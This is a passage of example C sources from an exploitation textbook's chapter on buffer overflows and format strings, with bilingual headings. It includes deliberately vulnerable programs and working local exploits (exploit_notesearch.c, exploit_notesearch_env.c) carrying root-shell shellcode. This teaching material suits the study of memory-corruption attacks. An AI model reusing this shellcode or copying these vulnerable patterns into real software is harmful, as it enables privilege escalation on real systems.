   while(input_char == '\n')    
      scanf("%c", &input_char); 
   
   name_ptr = (char *) &(player.name); 
   while(input_char != '\n') {  
      *name_ptr = input_char;   
      scanf("%c", &input_char); 
      name_ptr++;               
   }
   *name_ptr = 0;  
}


void print_cards(char *message, char *cards, int user_pick) {
   int i;

   printf("\n\t*** %s ***\n", message);
   printf("      \t._.\t._.\t._.\n");
   printf("Cards:\t|%c|\t|%c|\t|%c|\n\t", cards[0], cards[1], cards[2]);
   if(user_pick == -1)
      printf(" 1 \t 2 \t 3\n");
   else {
      for(i=0; i < user_pick; i++)
         printf("\t");
      printf(" ^-- your pick\n");
   }
}


int take_wager(int available_credits, int previous_wager) {
   int wager, total_wager;

   printf("How many of your %d credits would you like to wager?  ", available_credits);
   scanf("%d", &wager);
   if(wager < 1) {  
      printf("Nice try, but you must wager a positive number!\n");
      return -1;
   }
   total_wager = previous_wager + wager;
   if(total_wager > available_credits) {  
      printf("Your total wager of %d is more than you have!\n", total_wager);
      printf("You only have %d available credits, try again.\n", available_credits);
      return -1;
   }
   return wager;
}


void play_the_game() { 
   int play_again = 1;
   int (*game) ();
   char selection;

   while(play_again) {
      printf("\n[DEBUG] current_game pointer @ 0x%08x\n", player.current_game);
      if(player.current_game() != -1) { 
         if(player.credits > player.highscore) 
            player.highscore = player.credits; 
         printf("\nYou now have %u credits\n", player.credits);
         update_player_data(); 
         printf("Would you like to play again? (y/n)  ");
         selection = '\n';
         while(selection == '\n')   
            scanf("%c", &selection);
         if(selection == 'n')
            play_again = 0;
      }
      else  
         play_again = 0; 
   }
}


int pick_a_number() { 
   int pick, winning_number;

   printf("\n####### Pick a Number ######\n");
   printf("This game costs 10 credits to play. Simply pick a number\n");
   printf("between 1 and 20, and if you pick the winning number, you\n");
   printf("will win the jackpot of 100 credits!\n\n");
   winning_number = (rand() % 20) + 1; 
   if(player.credits < 10) {
      printf("You only have %d credits. That's not enough to play!\n\n", player.credits);
      return -1;  
   }
   player.credits -= 10; 
   printf("10 credits have been deducted from your account.\n");
   printf("Pick a number between 1 and 20: ");
   scanf("%d", &pick);

   printf("The winning number is %d\n", winning_number);
   if(pick == winning_number)
      jackpot();
   else
      printf("Sorry, you didn't win.\n");
   return 0;
}


int dealer_no_match() { 
   int i, j, numbers[16], wager = -1, match = -1;

   printf("\n::::::: No Match Dealer :::::::\n");
   printf("In this game, you can wager up to all of your credits.\n");
   printf("The dealer will deal out 16 random numbers between 0 and 99.\n");
   printf("If there are no matches among them, you double your money!\n\n");
  
   if(player.credits == 0) {
      printf("You don't have any credits to wager!\n\n");
      return -1;
   }
   while(wager == -1)
      wager = take_wager(player.credits, 0);

   printf("\t\t::: Dealing out 16 random numbers :::\n");
   for(i=0; i < 16; i++) {
      numbers[i] = rand() % 100; 
      printf("%2d\t", numbers[i]);
      if(i%8 == 7)  
         printf("\n");
   }
   for(i=0; i < 15; i++) {  
      j = i + 1;
      while(j < 16) {
         if(numbers[i] == numbers[j])
            match = numbers[i];
         j++;
      }
   }
   if(match != -1) {
      printf("The dealer matched the number %d!\n", match);
      printf("You lose %d credits.\n", wager);
      player.credits -= wager;
   } else {
      printf("There were no matches! You win %d credits!\n", wager);
      player.credits += wager;
   }
   return 0;
}


int find_the_ace() {
   int i, ace, total_wager;
   int invalid_choice, pick = -1, wager_one = -1, wager_two = -1;
   char choice_two, cards[3] = {'X', 'X', 'X'};

   ace = rand()%3; 
   printf("******* Find the Ace *******\n");
   printf("In this game, you can wager up to all of your credits.\n");
   printf("Three cards will be dealt out, two queens and one ace.\n");
   printf("If you find the ace, you will win your wager.\n");
   printf("After choosing a card, one of the queens will be revealed.\n");
   printf("At this point, you may either select a different card or\n");
   printf("increase your wager.\n\n");

   if(player.credits == 0) {
      printf("You don't have any credits to wager!\n\n");
      return -1;
   }
   
   while(wager_one == -1) 
      wager_one = take_wager(player.credits, 0);

   print_cards("Dealing cards", cards, -1);
   pick = -1;
   while((pick < 1) || (pick > 3)) {
      printf("Select a card: 1, 2, or 3  ");
      scanf("%d", &pick);
   }
   pick--;
   i=0;
   while(i == ace || i == pick) 
      i++;                      
   cards[i] = 'Q';
   print_cards("Revealing a queen", cards, pick);
   invalid_choice = 1;
   while(invalid_choice) {  
      printf("Would you like to:\n[c]hange your pick\tor\t[i]ncrease your wager?\n");
      printf("Select c or i:  ");
      choice_two = '\n';
      while(choice_two == '\n') 
         scanf("%c", &choice_two);
      if(choice_two == 'i') {  
            invalid_choice=0;   
            while(wager_two == -1)  
               wager_two = take_wager(player.credits, wager_one);
         }
      if(choice_two == 'c') {    
         i = invalid_choice = 0; 
         while(i == pick || cards[i] == 'Q') 
            i++;
         pick = i;
         printf("Your card pick has been changed to card %d\n", pick+1);
      }
   }

   for(i=0; i < 3; i++) { 
      if(ace == i)
         cards[i] = 'A';
      else
         cards[i] = 'Q';
   }
   print_cards("End result", cards, pick);
   
   if(pick == ace) { 
      printf("You have won %d credits from your first wager\n", wager_one);
      player.credits += wager_one;
      if(wager_two != -1) {
         printf("and an additional %d credits from your second wager!\n", wager_two);
         player.credits += wager_two;
      }
   } else { 
      printf("You have lost %d credits from your first wager\n", wager_one);
      player.credits -= wager_one;
      if(wager_two != -1) {
         printf("and an additional %d credits from your second wager!\n", wager_two);
         player.credits -= wager_two;
      }
   }
   return 0;
}

```
```
第3章 漏洞發掘 113
	0x300. EXPLOITATION

3.1 通用的漏洞發掘技術 115
	0x310. Generalized Exploit Techniques

3.2 緩沖區溢出 116
	0x320. Buffer Overflows
		overflow_example.c

#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
	int value = 5;
	char buffer_one[8], buffer_two[8];

	strcpy(buffer_one, "one"); 
	strcpy(buffer_two, "two"); 
	
	printf("[BEFORE] buffer_two is at %p and contains \'%s\'\n", buffer_two, buffer_two);
	printf("[BEFORE] buffer_one is at %p and contains \'%s\'\n", buffer_one, buffer_one);
	printf("[BEFORE] value is at %p and is %d (0x%08x)\n", &value, value, value);

	printf("\n[STRCPY] copying %d bytes into buffer_two\n\n",  strlen(argv[1]));
	strcpy(buffer_two, argv[1]); 

	printf("[AFTER] buffer_two is at %p and contains \'%s\'\n", buffer_two, buffer_two);
	printf("[AFTER] buffer_one is at %p and contains \'%s\'\n", buffer_one, buffer_one);
	printf("[AFTER] value is at %p and is %d (0x%08x)\n", &value, value, value);
}

		exploit_notesearch.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char shellcode[]= 
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";

int main(int argc, char *argv[]) {
   unsigned int i, *ptr, ret, offset=270;
   char *command, *buffer;

   command = (char *) malloc(200);
   bzero(command, 200); 

   strcpy(command, "./notesearch \'"); 
   buffer = command + strlen(command); 

   if(argc > 1) 
      offset = atoi(argv[1]);

   ret = (unsigned int) &i - offset; 

   for(i=0; i < 160; i+=4) 
      *((unsigned int *)(buffer+i)) = ret;
   memset(buffer, 0x90, 60); 
   memcpy(buffer+60, shellcode, sizeof(shellcode)-1); 

   strcat(command, "\'");

   system(command); 
   free(command);
}



	0x321. Stack-Based Buffer Overflow Vulnerabilities
		auth_overflow.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_authentication(char *password) {
	int auth_flag = 0;
	char password_buffer[16];

	strcpy(password_buffer, password);
	
	if(strcmp(password_buffer, "brillig") == 0)
		auth_flag = 1;
	if(strcmp(password_buffer, "outgrabe") == 0)
		auth_flag = 1;

	return auth_flag;
}

int main(int argc, char *argv[]) {
	if(argc < 2) {
		printf("Usage: %s <password>\n", argv[0]);
		exit(0);
	}
	if(check_authentication(argv[1])) {
		printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
		printf("      Access Granted.\n");
		printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
	} else {
		printf("\nAccess Denied.\n");
   }
}
	


		auth_overflow2.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_authentication(char *password) {
	char password_buffer[16];
	int auth_flag = 0;

	strcpy(password_buffer, password);
	
	if(strcmp(password_buffer, "brillig") == 0)
		auth_flag = 1;
	if(strcmp(password_buffer, "outgrabe") == 0)
		auth_flag = 1;

	return auth_flag;
}

int main(int argc, char *argv[]) {
	if(argc < 2) {
		printf("Usage: %s <password>\n", argv[0]);
		exit(0);
	}
	if(check_authentication(argv[1])) {
		printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
		printf("      Access Granted.\n");
		printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
	} else {
		printf("\nAccess Denied.\n");
   }
}
	



3.3 嘗試使用BASH 131
	0x330. Experimenting with BASH
		From exploit_notesearch.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char shellcode[]= 
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";

int main(int argc, char *argv[]) {
   unsigned int i, *ptr, ret, offset=270;
   char *command, *buffer;

   command = (char *) malloc(200);
   bzero(command, 200); 

   strcpy(command, "./notesearch \'"); 
   buffer = command + strlen(command); 

   if(argc > 1) 
      offset = atoi(argv[1]);

   ret = (unsigned int) &i - offset; 

   for(i=0; i < 160; i+=4) 
      *((unsigned int *)(buffer+i)) = ret;
   memset(buffer, 0x90, 60); 
   memcpy(buffer+60, shellcode, sizeof(shellcode)-1); 

   strcat(command, "\'");

   system(command); 
   free(command);
}



	0x331. Using the Environment
		getenv_example.c

#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
	printf("%s is at %p\n", argv[1], getenv(argv[1]));
}


		getenvaddr.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
	char *ptr;

	if(argc < 3) {
		printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
		exit(0);
	}
	ptr = getenv(argv[1]); 
	ptr += (strlen(argv[0]) - strlen(argv[2]))*2; 
	printf("%s will be at %p\n", argv[1], ptr);
}


		Code from libc-2.2.2
		exploit_notesearch_env.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char shellcode[]= 
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";

int main(int argc, char *argv[]) {
	char *env[2] = {shellcode, 0};
	unsigned int i, ret;

	char *buffer = (char *) malloc(160);

	ret = 0xbffffffa - (sizeof(shellcode)-1) - strlen("./notesearch");
	for(i=0; i < 160; i+=4)
		*((unsigned int *)(buffer+i)) = ret;
	
	execle("./notesearch", "notesearch", buffer, 0, env);
	free(buffer);
}




3.4 其他內存段中的溢出 147
	0x340. Overflows in Other Segments

3.4.1 一種基本的基於堆的溢出 148
	0x341. A Basic Heap-Based Overflow
		Excerpt from notetaker.c
		

3.4.2 函數指針溢出 153
	0x342. Overflowing Function Pointers
		From game_of_chance.c

3.5 格式化字符串 166
	0x350. Format Strings

3.5.1 格式化參數 166
	0x351. Format Parameters
		fmt_uncommon.c

#include <stdio.h>
#include <stdlib.h>

int main() {
   int A = 5, B = 7, count_one, count_two;

   
   printf("The number of bytes written up to this point X%n is being stored in count_one, and the number of bytes up to here X%n is being stored in count_two.\n", &count_one, &count_two);

   printf("count_one: %d\n", count_one);
   printf("count_two: %d\n", count_two);

  
   printf("A is %d and is at %08x.  B is %x.\n", A, &A, B);

   exit(0);
}	


3.5.2 格式化參數漏洞 168
	0x352. The Format String Vulnerability
		fmt_vuln.c


#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
   char text[1024];
   static int test_val = -72;

   if(argc < 2) {
      printf("Usage: %s <text to print>\n", argv[0]);
      exit(0);
   }
   strcpy(text, argv[1]);

   printf("The right way to print user-controlled input:\n");
   printf("%s", text);


   printf("\nThe wrong way to print user-controlled input:\n");
   printf(text);

   printf("\n");


   printf("[*] test_val @ 0x%08x = %d 0x%08x\n", &test_val, test_val, test_val);

   exit(0);
}



3.5.3 讀取任意內存地址的內容 170
	0x353. Reading from Arbitrary Memory Addresses

3.5.4 向任意內存地址寫入 171
	0x354. Writing to Arbitrary Memory Addresses

3.5.5 直接參數訪問 178
	0x355. Direct Parameter Access

3.5.6 使用short寫入 181
	0x356. Using Short Writes

3.5.7 使用.dtors 182
	0x357. Detours with .dtors
		dtors_sample.c
#include <stdio.h>
#include <stdlib.h>

static void cleanup(void) __attribute__ ((destructor));

main() {
   printf("Some actions happen in the main() function..\n");
   printf("and then when main() exits, the destructor is called..\n");

   exit(0);
}

void cleanup(void) {
   printf("In the cleanup function now..\n");
}



3.5.8 notesearch程序的另一個漏洞 187
	0x358. Another notesearch Vulnerability

3.5.9 重寫全域偏移表 189
	0x359. Overwriting the Global Offset Table
```
